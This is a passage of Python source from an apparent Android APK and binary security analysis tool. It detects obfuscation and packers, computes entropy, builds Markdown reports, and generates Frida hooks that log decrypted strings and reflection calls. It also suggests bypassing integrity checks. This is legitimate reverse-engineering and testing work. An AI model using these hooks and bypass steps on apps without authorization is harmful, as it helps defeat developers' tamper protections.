    for cls in dx.get_classes():
        for method in cls.get_methods():
            try:
                m = method.get_method()
                if m and m.get_code():
                    checked += 1
                    debug_info = m.get_code().get_debug()
                    if debug_info is None:
                        no_lines += 1
            except:
                pass
            
            if checked > 100:
                break
        if checked > 100:
            break
    
    return no_lines > checked * 0.8 if checked > 0 else False


def _check_encrypted_assets(apk) -> List[str]:
    """Check for potentially encrypted assets."""
    encrypted = []
    
    for f in apk.get_files():
        if f.startswith('assets/'):
            # Check for unusual extensions or patterns
            if any(ext in f for ext in ['.enc', '.dat', '.bin', '.encrypted']):
                encrypted.append(f)
            elif f.endswith('.so') or f.endswith('.dex'):
                encrypted.append(f"Suspicious asset: {f}")
    
    return encrypted


def _identify_obfuscation_tools(
    indicators: List[ObfuscationIndicator],
    class_naming: ClassNamingAnalysis,
    string_encryption: List[StringEncryptionPattern]
) -> List[str]:
    """Identify which obfuscation tools were likely used."""
    tools = []
    
    indicator_types = [i.indicator_type for i in indicators]
    
    # ProGuard/R8 detection
    if any(t.startswith('proguard') for t in indicator_types):
        if class_naming.obfuscation_ratio > 0.5:
            tools.append("ProGuard/R8 (aggressive)")
        else:
            tools.append("ProGuard/R8 (standard)")
    
    # DexGuard detection
    if 'dexguard' in indicator_types:
        tools.append("DexGuard (commercial)")
    
    # String encryption
    if string_encryption:
        encryption_types = set(p.pattern_name for p in string_encryption)
        if 'aes_decrypt' in encryption_types:
            tools.append("AES String Encryption")
        if 'xor_decrypt' in encryption_types:
            tools.append("XOR String Encryption")
    
    # Integrity checks
    if 'integrity_check' in indicator_types:
        tools.append("Integrity/Tamper Detection")
    
    # Reflection hiding
    if 'reflection_hiding' in indicator_types:
        tools.append("Reflection-based API Hiding")
    
    if not tools and class_naming.obfuscation_ratio > 0.2:
        tools.append("Basic Minification")
    
    return tools


def _calculate_obfuscation_score(
    class_naming: ClassNamingAnalysis,
    indicators: List[ObfuscationIndicator],
    string_encryption: List[StringEncryptionPattern],
    control_flow: List[ControlFlowObfuscation],
    native_protection: NativeProtection
) -> int:
    """Calculate an overall obfuscation score (0-100)."""
    score = 0
    
    # Class naming (up to 30 points)
    score += int(class_naming.obfuscation_ratio * 30)
    
    # Indicators (up to 25 points)
    high_conf = sum(1 for i in indicators if i.confidence == "high")
    med_conf = sum(1 for i in indicators if i.confidence == "medium")
    score += min(high_conf * 5 + med_conf * 2, 25)
    
    # String encryption (up to 20 points)
    if string_encryption:
        score += min(len(string_encryption) * 4, 20)
    
    # Control flow (up to 15 points)
    for cf in control_flow:
        score += int(cf.complexity_score * 7)
    score = min(score, 85)  # Cap at 85 before native
    
    # Native protection (up to 15 points)
    if native_protection.protection_indicators:
        score += min(len(native_protection.protection_indicators) * 5, 15)
    
    return min(score, 100)


def _generate_deobfuscation_strategies(
    tools: List[str],
    indicators: List[ObfuscationIndicator],
    string_encryption: List[StringEncryptionPattern]
) -> List[str]:
    """Generate recommended deobfuscation strategies."""
    strategies = []
    
    if any('ProGuard' in t for t in tools):
        strategies.append("Use JADX with deobfuscation enabled (--deobf flag)")
        strategies.append("Look for mapping.txt in the APK or build artifacts")
        strategies.append("Use JEB or similar tool for advanced rename suggestions")
    
    if any('DexGuard' in t for t in tools):
        strategies.append("Dynamic analysis with Frida recommended for DexGuard")
        strategies.append("Hook String decryption methods at runtime")
        strategies.append("Consider using DexGuard's commercial tools for analysis")
    
    if string_encryption:
        strategies.append("Hook string decryption methods with Frida to dump decrypted strings")
        strategies.append("Trace method calls to identify decryption routines")
        strategies.append("Memory dump analysis after app initialization")
    
    if any(i.indicator_type == 'reflection_hiding' for i in indicators):
        strategies.append("Hook Class.forName() and Method.invoke() to trace hidden API calls")
        strategies.append("Use Frida's Java.choose() to enumerate instantiated classes")
    
    if any(i.indicator_type == 'integrity_check' for i in indicators):
        strategies.append("Identify and bypass integrity checks before modification")
        strategies.append("Hook signature verification methods")
    
    if not strategies:
        strategies.append("APK appears to have minimal obfuscation")
        strategies.append("Standard static analysis with JADX should be effective")
    
    return strategies


def _recommend_deobfuscation_tools(tools: List[str], level: str) -> List[str]:
    """Recommend tools based on obfuscation level."""
    recommended = []
    
    # Always recommend JADX
    recommended.append("JADX - Primary decompiler with deobfuscation support")
    
    if level in ['moderate', 'heavy', 'extreme']:
        recommended.append("Frida - Dynamic instrumentation for runtime analysis")
        recommended.append("Objection - Frida-based runtime exploration")
    
    if level in ['heavy', 'extreme']:
        recommended.append("JEB Decompiler - Commercial tool with advanced deobfuscation")
        recommended.append("Ghidra with DEX support - For native library analysis")
    
    if any('DexGuard' in t for t in tools):
        recommended.append("Consider commercial tools (JEB, IDA Pro) for DexGuard")
    
    if level == 'extreme':
        recommended.append("Custom Frida scripts for targeted analysis")
        recommended.append("Memory forensics tools (Volatility, etc.)")
    
    return recommended


def _generate_string_decrypt_hook(class_name: str, method_name: str) -> str:
    """Generate a Frida hook for a string decryption method."""
    java_class = class_name.replace('/', '.').lstrip('L').rstrip(';')
    
    return f'''Java.perform(function() {{
    var DecryptClass = Java.use("{java_class}");
    DecryptClass.{method_name}.overload("java.lang.String").implementation = function(encrypted) {{
        var result = this.{method_name}(encrypted);
        console.log("[DECRYPT] " + encrypted + " -> " + result);
        return result;
    }};
}});'''


def _generate_frida_hooks(
    string_encryption: List[StringEncryptionPattern],
    dx,
    package_name: str
) -> List[str]:
    """Generate useful Frida hooks based on analysis."""
    hooks = []
    
    # String decryption hooks
    for pattern in string_encryption[:3]:  # Limit to 3
        if pattern.suggested_frida_hook:
            hooks.append(pattern.suggested_frida_hook)
    
    # Generic hooks
    hooks.append(f'''// Hook app launch
Java.perform(function() {{
    var Activity = Java.use("android.app.Activity");
    Activity.onCreate.overload("android.os.Bundle").implementation = function(bundle) {{
        console.log("[ACTIVITY] " + this.getClass().getName() + " created");
        this.onCreate(bundle);
    }};
}});''')
    
    hooks.append('''// Dump all loaded classes
Java.perform(function() {
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.includes("''' + package_name.split('.')[0] + '''")) {
                console.log("[CLASS] " + className);
            }
        },
        onComplete: function() {}
    });
});''')
    
    hooks.append('''// Hook reflection (Class.forName)
Java.perform(function() {
    var Class = Java.use("java.lang.Class");
    Class.forName.overload("java.lang.String").implementation = function(name) {
        console.log("[REFLECTION] Class.forName: " + name);
        return this.forName(name);
    };
});''')
    
    return hooks


# ============================================================================
# Binary Entropy Analysis
# ============================================================================

@dataclass
class EntropyDataPoint:
    """A single entropy measurement at an offset."""
    offset: int
    entropy: float  # 0.0 to 8.0 (bits per byte)
    size: int  # Window size used


@dataclass
class EntropyRegion:
    """A region with notable entropy characteristics."""
    start_offset: int
    end_offset: int
    avg_entropy: float
    max_entropy: float
    min_entropy: float
    classification: str  # "packed", "encrypted", "code", "data", "sparse"
    section_name: Optional[str] = None
    description: str = ""


@dataclass
class EntropyAnalysisResult:
    """Complete entropy analysis result for a binary."""
    filename: str
    file_size: int
    overall_entropy: float
    entropy_data: List[EntropyDataPoint]  # For visualization
    regions: List[EntropyRegion]
    is_likely_packed: bool
    packing_confidence: float  # 0.0 to 1.0
    detected_packers: List[str]
    section_entropy: List[Dict[str, Any]]  # Per-section entropy for PE/ELF
    analysis_notes: List[str]
    window_size: int
    step_size: int


def calculate_entropy(data: bytes) -> float:
    """Calculate Shannon entropy of data (bits per byte, 0-8)."""
    if not data:
        return 0.0
    
    # Count byte frequencies
    freq = [0] * 256
    for byte in data:
        freq[byte] += 1
    
    # Calculate entropy
    length = len(data)
    entropy = 0.0
    for count in freq:
        if count > 0:
            p = count / length
            entropy -= p * math.log2(p)
    
    return entropy


def analyze_binary_entropy(
    file_path: Path,
    window_size: int = 256,
    step_size: int = 128
) -> EntropyAnalysisResult:
    """
    Analyze entropy distribution across a binary file.
    
    Args:
        file_path: Path to the binary file
        window_size: Size of sliding window for entropy calculation
        step_size: Step size between measurements
    
    Returns:
        EntropyAnalysisResult with entropy data and classification
    """
    import time
    start_time = time.time()
    
    filename = file_path.name
    file_size = file_path.stat().st_size
    analysis_notes = []
    
    # Read the entire file
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # Calculate overall entropy
    overall_entropy = calculate_entropy(data)
    
    # Calculate entropy at regular intervals
    entropy_data = []
    offset = 0
    while offset + window_size <= len(data):
        window = data[offset:offset + window_size]
        entropy = calculate_entropy(window)
        entropy_data.append(EntropyDataPoint(
            offset=offset,
            entropy=round(entropy, 4),
            size=window_size
        ))
        offset += step_size
    
    # Analyze per-section entropy for PE/ELF files
    section_entropy = []
    regions = []
    
    # Try PE analysis
    if PEFILE_AVAILABLE and data[:2] == b'MZ':
        try:
            pe = pefile.PE(data=data)
            for section in pe.sections:
                section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
                section_data = section.get_data()
                sect_entropy = calculate_entropy(section_data)
                
                section_entropy.append({
                    'name': section_name,
                    'virtual_address': section.VirtualAddress,
                    'raw_size': section.SizeOfRawData,
                    'virtual_size': section.Misc_VirtualSize,
                    'entropy': round(sect_entropy, 4),
                    'characteristics': hex(section.Characteristics)
                })
                
                # Classify section
                classification = _classify_entropy_region(sect_entropy, section_name)
                regions.append(EntropyRegion(
                    start_offset=section.PointerToRawData,
                    end_offset=section.PointerToRawData + section.SizeOfRawData,
                    avg_entropy=sect_entropy,
                    max_entropy=sect_entropy,
                    min_entropy=sect_entropy,
                    classification=classification,
                    section_name=section_name,
                    description=_get_entropy_description(sect_entropy, section_name)
                ))
            pe.close()
        except Exception as e:
            analysis_notes.append(f"PE parsing error: {str(e)}")
    
    # Try ELF analysis
    elif PYELFTOOLS_AVAILABLE and data[:4] == b'\x7fELF':
        try:
            from io import BytesIO
            elf = ELFFile(BytesIO(data))
            for section in elf.iter_sections():
                section_name = section.name
                if section.data_size > 0:
                    section_data = section.data()
                    sect_entropy = calculate_entropy(section_data)
                    
                    section_entropy.append({
                        'name': section_name,
                        'address': section['sh_addr'],
                        'size': section.data_size,
                        'entropy': round(sect_entropy, 4),
                        'type': section['sh_type']
                    })
                    
                    classification = _classify_entropy_region(sect_entropy, section_name)
                    regions.append(EntropyRegion(
                        start_offset=section['sh_offset'],
                        end_offset=section['sh_offset'] + section.data_size,
                        avg_entropy=sect_entropy,
                        max_entropy=sect_entropy,
                        min_entropy=sect_entropy,
                        classification=classification,
                        section_name=section_name,
                        description=_get_entropy_description(sect_entropy, section_name)
                    ))
        except Exception as e:
            analysis_notes.append(f"ELF parsing error: {str(e)}")
    
    # Identify high-entropy regions if no section info
    if not regions:
        regions = _find_entropy_regions(entropy_data)
    
    # Detect packing
    is_packed, pack_confidence, packers = _detect_packing(
        overall_entropy, section_entropy, data, regions
    )
    
    if is_packed:
        analysis_notes.append(f"Binary appears to be packed (confidence: {pack_confidence:.0%})")
        if packers:
            analysis_notes.append(f"Possible packers: {', '.join(packers)}")
    
    # Add entropy classification notes
    if overall_entropy > 7.5:
        analysis_notes.append("Very high overall entropy - likely encrypted or compressed")
    elif overall_entropy > 7.0:
        analysis_notes.append("High overall entropy - possibly packed or obfuscated")
    elif overall_entropy < 4.0:
        analysis_notes.append("Low overall entropy - mostly data or sparse content")
    
    return EntropyAnalysisResult(
        filename=filename,
        file_size=file_size,
        overall_entropy=round(overall_entropy, 4),
        entropy_data=entropy_data,
        regions=regions,
        is_likely_packed=is_packed,
        packing_confidence=round(pack_confidence, 3),
        detected_packers=packers,
        section_entropy=section_entropy,
        analysis_notes=analysis_notes,
        window_size=window_size,
        step_size=step_size
    )


def _classify_entropy_region(entropy: float, section_name: str = "") -> str:
    """Classify a region based on its entropy."""
    section_lower = section_name.lower()
    
    # Known section patterns
    if section_lower in ['.text', '__text', 'code']:
        if entropy > 6.5:
            return "packed_code"
        return "code"
    
    if section_lower in ['.data', '__data', '.rdata', '__const']:
        if entropy > 7.0:
            return "encrypted"
        return "data"
    
    if section_lower in ['.rsrc', '__DATA']:
        return "resources"
    
    # Entropy-based classification
    if entropy > 7.8:
        return "encrypted"
    elif entropy > 7.2:
        return "packed"
    elif entropy > 6.0:
        return "code"
    elif entropy > 4.0:
        return "data"
    elif entropy > 1.0:
        return "sparse"
    else:
        return "empty"


def _get_entropy_description(entropy: float, section_name: str = "") -> str:
    """Get a human-readable description of entropy level."""
    if entropy > 7.8:
        return "Very high entropy - encrypted or heavily compressed"
    elif entropy > 7.2:
        return "High entropy - likely packed or compressed"
    elif entropy > 6.5:
        return "Elevated entropy - compiled code or light compression"
    elif entropy > 5.5:
        return "Moderate entropy - typical executable code"
    elif entropy > 4.0:
        return "Low-moderate entropy - mixed code and data"
    elif entropy > 2.0:
        return "Low entropy - mostly data or strings"
    else:
        return "Very low entropy - sparse or repetitive data"


def _find_entropy_regions(entropy_data: List[EntropyDataPoint]) -> List[EntropyRegion]:
    """Find distinct entropy regions in the data."""
    if not entropy_data:
        return []
    
    regions = []
    current_class = _classify_entropy_region(entropy_data[0].entropy)
    start_offset = entropy_data[0].offset
    entropies = [entropy_data[0].entropy]
    
    for point in entropy_data[1:]:
        point_class = _classify_entropy_region(point.entropy)
        
        if point_class != current_class:
            # End current region
            regions.append(EntropyRegion(
                start_offset=start_offset,
                end_offset=point.offset,
                avg_entropy=sum(entropies) / len(entropies),
                max_entropy=max(entropies),
                min_entropy=min(entropies),
                classification=current_class,
                description=_get_entropy_description(sum(entropies) / len(entropies))
            ))
            # Start new region
            current_class = point_class
            start_offset = point.offset
            entropies = [point.entropy]
        else:
            entropies.append(point.entropy)
    
    # Add final region
    if entropies:
        regions.append(EntropyRegion(
            start_offset=start_offset,
            end_offset=entropy_data[-1].offset + entropy_data[-1].size,
            avg_entropy=sum(entropies) / len(entropies),
            max_entropy=max(entropies),
            min_entropy=min(entropies),
            classification=current_class,
            description=_get_entropy_description(sum(entropies) / len(entropies))
        ))
    
    return regions


def _detect_packing(
    overall_entropy: float,
    section_entropy: List[Dict],
    data: bytes,
    regions: List[EntropyRegion]
) -> tuple:
    """Detect if binary is likely packed and identify possible packers."""
    is_packed = False
    confidence = 0.0
    packers = []
    
    # Check overall entropy
    if overall_entropy > 7.2:
        is_packed = True
        confidence += 0.3
    elif overall_entropy > 6.8:
        confidence += 0.15
    
    # Check for high entropy in code sections
    for sect in section_entropy:
        if sect.get('name', '').lower() in ['.text', '__text', 'code', '.code']:
            if sect['entropy'] > 7.0:
                is_packed = True
                confidence += 0.3
            elif sect['entropy'] > 6.5:
                confidence += 0.15
    
    # Check for UPX signature
    if b'UPX!' in data or b'UPX0' in data or b'UPX1' in data:
        is_packed = True
        packers.append('UPX')
        confidence += 0.4
    
    # Check for other packer signatures
    packer_signatures = {
        b'PEC2': 'PECompact',
        b'ASPack': 'ASPack',
        b'.aspack': 'ASPack',
        b'.adata': 'ASProtect',
        b'FSG!': 'FSG',
        b'MPRESS': 'MPRESS',
        b'.nsp0': 'NsPack',
        b'.nsp1': 'NsPack',
        b'MEW': 'MEW',
        b'.petite': 'Petite',
        b'PEtite': 'Petite',
        b'Themida': 'Themida',
        b'.themida': 'Themida',
        b'VMProtect': 'VMProtect',
        b'.vmp0': 'VMProtect',
        b'.vmp1': 'VMProtect',
        b'Obsidium': 'Obsidium',
        b'.enigma': 'Enigma Protector',
    }
    
    for sig, name in packer_signatures.items():
        if sig in data:
            is_packed = True
            if name not in packers:
                packers.append(name)
            confidence += 0.3
    
    # Check for small code section with high entropy data
    if section_entropy:
        text_size = 0
        data_entropy = 0
        for sect in section_entropy:
            name = sect.get('name', '').lower()
            if name in ['.text', '__text', 'code']:
                text_size = sect.get('raw_size', sect.get('size', 0))
            elif name in ['.data', '.rdata'] and sect['entropy'] > 7.0:
                data_entropy = sect['entropy']
        
        if text_size < 10000 and data_entropy > 7.0:
            is_packed = True
            confidence += 0.2
    
    # Cap confidence at 1.0
    confidence = min(confidence, 1.0)
    
    # Set packed flag based on confidence
    if confidence > 0.5:
        is_packed = True
    
    return is_packed, confidence, packers


# ============================================================================
# APK Report Export Functions
# ============================================================================

def generate_apk_markdown_report(
    result: ApkAnalysisResult,
    report_type: str = "both",
    decompiled_code_findings: Optional[List[Dict]] = None,
    cve_scan_results: Optional[List[Dict]] = None,
    ai_architecture_diagram: Optional[str] = None,
    ai_attack_surface_map: Optional[str] = None,
    dynamic_analysis: Optional[Dict[str, Any]] = None
) -> str:
    """
    Generate a formatted Markdown report for APK analysis.
    
    Args:
        result: APK analysis result
        report_type: "functionality", "security", or "both"
        decompiled_code_findings: Optional list of findings from pattern-based scanners
        cve_scan_results: Optional list of CVE findings from dependency scanning
        ai_architecture_diagram: Optional Mermaid diagram for app architecture
        ai_attack_surface_map: Optional Mermaid diagram for attack surface
        dynamic_analysis: Optional Frida scripts and dynamic analysis data
    
    Returns:
        Markdown formatted string
    """
    md = []
    
    # Header
    md.append(f"# APK Analysis Report")
    md.append(f"**Package:** {result.package_name}")
    md.append(f"**App Name:** {result.app_name or 'Unknown'}")
    md.append(f"**Version:** {result.version_name} (code: {result.version_code})")
    md.append(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    md.append("")
    md.append("---")
    md.append("")
    
    # ==================== FUNCTIONALITY REPORT ====================
    if report_type in ["functionality", "both"]:
        md.append("##  What Does This APK Do")
        md.append("")
        
        # App Overview
        md.append("### App Overview")
        md.append("")
        md.append(f"- **Package:** `{result.package_name}`")
        md.append(f"- **Min SDK:** {result.min_sdk} (Android {5 + (result.min_sdk - 21) if result.min_sdk and result.min_sdk >= 21 else 'Legacy'})")
        md.append(f"- **Target SDK:** {result.target_sdk}")
        md.append(f"- **Debuggable:** {'Yes ' if result.debuggable else 'No '}")
        md.append(f"- **Allows Backup:** {'Yes ' if result.allow_backup else 'No '}")
        md.append("")
        
        # Components
        md.append("### App Components")
        md.append("")
        md.append(f"- **Activities:** {len(result.activities)}")
        md.append(f"- **Services:** {len(result.services)}")
        md.append(f"- **Broadcast Receivers:** {len(result.receivers)}")
        md.append(f"- **Content Providers:** {len(result.providers)}")
        md.append("")
        
        if result.activities:
            md.append("#### Activities")
            for act in result.activities[:10]:
                md.append(f"- `{act}`")
            if len(result.activities) > 10:
                md.append(f"- ... and {len(result.activities) - 10} more")
            md.append("")
        
        if result.services:
            md.append("#### Services")
            for svc in result.services[:10]:
                md.append(f"- `{svc}`")
            if len(result.services) > 10:
                md.append(f"- ... and {len(result.services) - 10} more")
            md.append("")
        
        # Permissions Summary
        md.append("### Permissions Summary")
        md.append("")
        dangerous_perms = [p for p in result.permissions if p.is_dangerous]
        md.append(f"- **Total Permissions:** {len(result.permissions)}")
        md.append(f"- **Dangerous Permissions:** {len(dangerous_perms)}")
        md.append("")
        
        if dangerous_perms:
            md.append("#### Dangerous Permissions")
            for perm in dangerous_perms:
                desc = perm.description or "No description"
                md.append(f"- **{perm.name.replace('android.permission.', '')}**: {desc}")
            md.append("")
        
        # Network Indicators
        if result.urls:
            md.append("### Network Communication")
            md.append("")
            md.append("URLs found in the APK:")
            for url in result.urls[:15]:
                md.append(f"- `{url[:100]}`")
            if len(result.urls) > 15:
                md.append(f"- ... and {len(result.urls) - 15} more")
            md.append("")
        
        # Native Libraries
        if result.native_libraries:
            md.append("### Native Libraries")
            md.append("")
            for lib in result.native_libraries:
                md.append(f"- `{lib}`")
            md.append("")
        
        # AI Functionality Report
        if result.ai_report_functionality:
            md.append("### AI Analysis: App Functionality")
            md.append("")
            # Convert HTML to basic markdown
            html_content = result.ai_report_functionality
            # Strip HTML tags but keep content
            import re
            html_content = re.sub(r'<h3[^>]*>', '\n#### ', html_content)
            html_content = re.sub(r'</h3>', '\n', html_content)
            html_content = re.sub(r'<strong>', '**', html_content)
            html_content = re.sub(r'</strong>', '**', html_content)
            html_content = re.sub(r'<li>', '- ', html_content)
            html_content = re.sub(r'</li>', '\n', html_content)
            html_content = re.sub(r'<[^>]+>', '', html_content)
            md.append(html_content)
            md.append("")
        
        md.append("---")
        md.append("")
    
    # ==================== SECURITY REPORT ====================
    if report_type in ["security", "both"]:
        md.append("##  Security Findings")
        md.append("")
        
        # Security Overview
        md.append("### Security Overview")
        md.append("")
        md.append(f"- **Security Issues Found:** {len(result.security_issues)}")
        md.append(f"- **Secrets Detected:** {len(result.secrets)}")
        md.append(f"- **Dangerous Permissions:** {len([p for p in result.permissions if p.is_dangerous])}")
        md.append("")
        
        # Certificate Analysis
        if result.certificate:
            md.append("### Certificate Analysis")
            md.append("")
            cert = result.certificate
            status = " DEBUG CERTIFICATE" if cert.is_debug_cert else " Production Certificate"
            md.append(f"- **Status:** {status}")
            md.append(f"- **Subject:** `{cert.subject}`")
            md.append(f"- **Issuer:** `{cert.issuer}`")
            md.append(f"- **Valid From:** {cert.valid_from}")
            md.append(f"- **Valid Until:** {cert.valid_until}")
            md.append(f"- **Signature Version:** {cert.signature_version}")
            if cert.is_expired:
                md.append("- ** EXPIRED**")
            md.append("")
        
        # Security Issues
        if result.security_issues:
            md.append("### Security Issues")
            md.append("")
            
            # Group by severity
            by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
            for issue in result.security_issues:
                sev = issue.get("severity", "info").lower()
                if sev in by_severity:
                    by_severity[sev].append(issue)
                else:
                    by_severity["info"].append(issue)
            
            severity_emoji = {
                "critical": "",
                "high": "",
                "medium": "",
                "low": "",
                "info": ""
            }
            
            for sev in ["critical", "high", "medium", "low", "info"]:
                issues = by_severity[sev]
                if issues:
                    md.append(f"#### {severity_emoji[sev]} {sev.upper()} ({len(issues)})")
                    md.append("")
                    for issue in issues:
                        md.append(f"- **{issue.get('category', 'Unknown')}:** {issue.get('description', 'No description')}")
                        if issue.get('recommendation'):
                            md.append(f"  -  *Recommendation: {issue['recommendation']}*")
                    md.append("")
        
        # Secrets Found
        if result.secrets:
            md.append("### Secrets & Hardcoded Credentials")
            md.append("")
            md.append("| Type | Value (Masked) | Severity |")
            md.append("|------|----------------|----------|")
            for secret in result.secrets[:20]:
                md.append(f"| {secret.get('type', 'Unknown')} | `{secret.get('masked_value', '***')}` | {secret.get('severity', 'Unknown')} |")
            if len(result.secrets) > 20:
                md.append(f"| ... | {len(result.secrets) - 20} more | ... |")
            md.append("")
        
        # Decompiled Code Security Findings (Pattern-Based Scanners)
        if decompiled_code_findings:
            md.append("### Source Code Vulnerability Scan")
            md.append("")
            md.append(f"**Total Findings:** {len(decompiled_code_findings)}")
            md.append("")
            
            # Group by severity
            by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
            for finding in decompiled_code_findings:
                sev = finding.get("severity", "info").lower()
                if sev in by_severity:
                    by_severity[sev].append(finding)
                else:
                    by_severity["info"].append(finding)
            
            severity_emoji = {"critical": "", "high": "", "medium": "", "low": "", "info": ""}
            
            for sev in ["critical", "high", "medium", "low"]:
                findings = by_severity[sev]
                if findings:
                    md.append(f"#### {severity_emoji[sev]} {sev.upper()} Vulnerabilities ({len(findings)})")
                    md.append("")
                    for f in findings[:15]:  # Limit to 15 per severity
                        md.append(f"**{f.get('title', 'Unknown')}** - `{f.get('file_path', 'unknown')}:{f.get('line_number', 0)}`")
                        md.append("")
                        md.append(f"- **Category:** {f.get('category', 'Unknown')}")
                        if f.get('cwe_id'):
                            md.append(f"- **CWE:** {f.get('cwe_id')}")
                        md.append(f"- **Description:** {f.get('description', 'N/A')}")
                        md.append("")
                        if f.get('code_snippet'):
                            md.append("```java")
                            md.append(f.get('code_snippet', ''))
                            md.append("```")
                            md.append("")
                        if f.get('exploitation'):
                            md.append(f"**Exploitation:**")
                            md.append(f"> {f.get('exploitation', '')[:300]}")
                            md.append("")
                        if f.get('remediation'):
                            md.append(f"**Remediation:** {f.get('remediation', '')[:200]}")
                            md.append("")
                        md.append("---")
                        md.append("")
                    if len(findings) > 15:
                        md.append(f"*... and {len(findings) - 15} more {sev} findings*")
                        md.append("")
        
        # Hardening Score
        if result.hardening_score:
            hs = result.hardening_score
            md.append("### Security Hardening Score")
            md.append("")
            md.append(f"- **Overall Score:** {hs.get('score', 0)}/100")
            md.append(f"- **Grade:** {hs.get('grade', 'N/A')}")
            md.append("")
            
            if hs.get('passed_checks'):
                md.append("####  Passed Checks")
                for check in hs['passed_checks'][:10]:
                    md.append(f"- {check}")
                md.append("")
            
            if hs.get('failed_checks'):
                md.append("####  Failed Checks")
                for check in hs['failed_checks'][:10]:
                    md.append(f"- {check}")
                md.append("")
        
        # AI Security Report
        if result.ai_report_security:
            md.append("### AI Security Analysis")
            md.append("")
            # Convert HTML to basic markdown
            import re
            html_content = result.ai_report_security
            html_content = re.sub(r'<h3[^>]*>', '\n#### ', html_content)
            html_content = re.sub(r'</h3>', '\n', html_content)
            html_content = re.sub(r'<strong>', '**', html_content)
            html_content = re.sub(r'</strong>', '**', html_content)
            html_content = re.sub(r'<li>', '- ', html_content)
            html_content = re.sub(r'</li>', '\n', html_content)
            html_content = re.sub(r'<span[^>]*>([^<]+)</span>', r'\1', html_content)
            html_content = re.sub(r'<[^>]+>', '', html_content)
            md.append(html_content)
            md.append("")
    
    # ==================== CVE SCAN RESULTS ====================
    if cve_scan_results:
        md.append("##  Known CVEs in Dependencies")
        md.append("")
        md.append(f"**Total CVEs Found:** {len(cve_scan_results)}")
        md.append("")
        
        # Group by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": []}
        for cve in cve_scan_results:
            sev = cve.get("severity", "medium").lower()
            if sev in by_severity:
                by_severity[sev].append(cve)
            else:
                by_severity["medium"].append(cve)
        
        severity_emoji = {"critical": "", "high": "", "medium": "", "low": ""}
        
        for sev in ["critical", "high", "medium", "low"]:
            cves = by_severity[sev]
            if cves:
                md.append(f"### {severity_emoji[sev]} {sev.upper()} CVEs ({len(cves)})")
                md.append("")
                for cve in cves[:15]:
                    cve_id = cve.get("cve_id", "Unknown")
                    package = cve.get("package", "Unknown")
                    version = cve.get("version", "Unknown")
                    summary = cve.get("summary", "No description available")[:200]
                    
                    md.append(f"#### {cve_id}")
                    md.append(f"- **Package:** `{package}` (v{version})")
                    md.append(f"- **Summary:** {summary}")
                    
                    if cve.get("cvss_score"):
                        md.append(f"- **CVSS Score:** {cve.get('cvss_score')}")
                    if cve.get("fixed_version"):
                        md.append(f"- **Fixed in:** v{cve.get('fixed_version')}")
                    if cve.get("references"):
                        refs = cve.get("references", [])[:2]
                        md.append(f"- **References:** {', '.join(refs)}")
                    md.append("")
                
                if len(cves) > 15:
                    md.append(f"*... and {len(cves) - 15} more {sev} CVEs*")
                    md.append("")
        md.append("---")
        md.append("")
    
    # ==================== FRIDA SCRIPTS FOR DYNAMIC TESTING ====================
    if dynamic_analysis and dynamic_analysis.get('frida_scripts'):
        md.append("##  Frida Scripts for Dynamic Testing")
        md.append("")
        md.append("Auto-generated Frida scripts based on static analysis findings. These scripts can be used ")
        md.append("to bypass security protections and monitor sensitive operations during dynamic testing.")
        md.append("")
        
        # Detection Summary
        detections = dynamic_analysis.get('detections', {})
        if detections:
            md.append("### Security Protection Detection")
            md.append("")
            md.append("| Protection | Detected |")
            md.append("|------------|----------|")
            detection_labels = {
                'ssl_pinning_detected': 'SSL/TLS Pinning',
                'root_detection_detected': 'Root Detection',
                'emulator_detection_detected': 'Emulator Detection',
                'anti_debug_detected': 'Anti-Debugging',
                'anti_tampering_detected': 'Anti-Tampering'
            }
            for key, label in detection_labels.items():
                detected = " Yes" if detections.get(key, False) else " No"
                md.append(f"| {label} | {detected} |")
            md.append("")
        
        # Frida Commands
        if dynamic_analysis.get('frida_spawn_command') or dynamic_analysis.get('frida_attach_command'):
            md.append("### Quick Start Commands")
            md.append("")
            if dynamic_analysis.get('frida_spawn_command'):
                md.append("**Spawn Mode** (starts app with hooks):")
                md.append("```bash")
                md.append(dynamic_analysis['frida_spawn_command'])
                md.append("```")
                md.append("")
            if dynamic_analysis.get('frida_attach_command'):
                md.append("**Attach Mode** (hooks running app):")
                md.append("```bash")
                md.append(dynamic_analysis['frida_attach_command'])
                md.append("```")
                md.append("")
        
        # Scripts List
        scripts = dynamic_analysis.get('frida_scripts', [])
        if scripts:
            md.append("### Available Scripts")
            md.append("")
            md.append(f"**Total Scripts Generated:** {len(scripts)}")
            md.append("")
            
            for script in scripts:
                script_name = script.get('name', 'Unknown Script')
                script_category = script.get('category', 'general')
                script_desc = script.get('description', 'No description')
                script_usage = script.get('usage_instructions', '')
                
                md.append(f"####  {script_name}")
                md.append(f"*Category: {script_category}*")
                md.append("")
                md.append(f"{script_desc}")
                md.append("")
                
                if script_usage:
                    md.append("**Usage:**")
                    md.append("```bash")
                    md.append(script_usage)
                    md.append("```")
                    md.append("")
                
                # Include script code (truncated for readability)
                script_code = script.get('script_code', '')
                if script_code:
                    md.append("<details>")
                    md.append(f"<summary>View {script_name} Code ({len(script_code)} chars)</summary>")
                    md.append("")
                    md.append("```javascript")
                    # Truncate very long scripts
                    if len(script_code) > 3000:
                        md.append(script_code[:3000])
                        md.append(f"\n// ... truncated ({len(script_code) - 3000} more chars)")
                    else:
                        md.append(script_code)
                    md.append("```")
                    md.append("</details>")
                    md.append("")
        
        md.append("---")
        md.append("")
    
    # ==================== AI ARCHITECTURE DIAGRAM ====================
    if ai_architecture_diagram:
        md.append("##  Application Architecture")
        md.append("")
        md.append("```mermaid")
        md.append(ai_architecture_diagram)
        md.append("```")
        md.append("")
        md.append("---")
        md.append("")
    
    # ==================== AI ATTACK SURFACE MAP ====================
    if ai_attack_surface_map:
        md.append("##  Attack Surface Map")
        md.append("")
        md.append("```mermaid")
        md.append(ai_attack_surface_map)
        md.append("```")
        md.append("")
    
    return "\n".join(md)


def generate_apk_pdf_report(
    result: ApkAnalysisResult,
    report_type: str = "both",
    decompiled_code_findings: Optional[List[Dict]] = None,
    cve_scan_results: Optional[List[Dict]] = None,
    ai_architecture_diagram: Optional[str] = None,
    ai_attack_surface_map: Optional[str] = None,
